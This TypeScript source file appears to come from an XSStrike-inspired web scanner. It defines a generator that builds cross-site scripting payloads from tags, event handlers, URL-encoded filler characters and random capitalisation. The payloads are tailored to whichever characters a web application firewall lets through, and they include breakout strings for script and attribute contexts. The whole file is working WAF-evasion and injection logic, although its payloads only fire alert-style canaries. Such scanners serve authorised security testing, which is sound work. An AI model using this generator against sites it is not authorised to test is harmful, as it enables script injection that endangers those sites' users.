/*---------------------------------------------------------------------------------------------
 *  Copyright (c) HikariSystem. All rights reserved.
 *  Licensed under the MIT License for XSStrike-inspired logic.
 *--------------------------------------------------------------------------------------------*/

import { FilterScore } from './wafFuzzer';

/**
 * Dynamic Generator
 * Constructs context-aware XSS payloads dynamically using only WAF-allowed characters
 * and random capitalization permutations to bypass signatures.
 */
export class DynamicGenerator {
	private allowedChars: Set<string>;

	// Base components
	private tags = ['svg', 'details', 'body', 'iframe', 'object', 'embed', 'script'];
	private events = ['onload', 'onerror', 'ontoggle', 'onfocus', 'onmouseover'];
	private fillings = [' ', '%09', '%0a', '%0d', '/', '%2f'];
	private primitives = ['alert(1)', 'prompt(1)', 'confirm(1)'];

	constructor(filterScores: FilterScore[]) {
		this.allowedChars = new Set(
			filterScores.filter(s => s.status === 'passed').map(s => s.char)
		);
	}

	/**
	 * Generates payloads tailored to bypass the discovered WAF filters.
	 */
	public generate(context: 'html' | 'attribute' | 'script', jsBreaker: string = '', canary: string = ''): string[] {
		const payloads: string[] = [];
		const marker = `dlx${canary}`;

		if (context === 'script') {
			// e.g. `";}alert(1);//`
			this.primitives.forEach(prim => {
				const inj = prim.replace('1', `'${canary}'`);
				payloads.push(`${jsBreaker};${inj};//`);
				payloads.push(`${jsBreaker};${inj};/*`);
			});
			return payloads;
		}

		// HTML or Attribute context: Permute tags and events
		if (!this.allowedChars.has('<') || !this.allowedChars.has('>')) {
			// If WAF blocks `<` or `>`, we can't do HTML breakout. 
			// We have to rely on attribute injection or URL injections.
			if (context === 'attribute') {
				this.events.forEach(evt => {
					this.primitives.forEach(prim => {
						const inj = prim.replace('1', `'${canary}'`);
						const e = this.randomCasing(evt);
						payloads.push(`" ${e}=${inj} class=${marker} x="`);
						payloads.push(`' ${e}=${inj} class=${marker} x='`);
					});
				});
			}
			return payloads;
		}

		// Full HTML permutation
		this.tags.forEach(tag => {
			this.events.forEach(evt => {
				this.fillings.forEach(fill => {
					this.primitives.forEach(prim => {
						const t = this.randomCasing(tag);
						const e = this.randomCasing(evt);
						const inj = prim.replace('1', `'${canary}'`);

						// e.g. <sVg/onLOad=alert(1) class=dlx123>
						payloads.push(`<${t}${fill}${e}=${inj} class=${marker}>`);

						if (this.allowedChars.has('"')) {
							payloads.push(`<${t}${fill}${e}="${inj}" class=${marker}>`);
						}
						
						// If attribute context, we need to break out first
						if (context === 'attribute') {
							payloads.push(`"><${t}${fill}${e}=${inj} class=${marker}>`);
							payloads.push(`'><${t}${fill}${e}=${inj} class=${marker}>`);
						}
					});
				});
			});
		});

		return payloads;
	}

	private randomCasing(text: string): string {
		let res = '';
		for (const char of text) {
			res += Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase();
		}
		return res;
	}
}
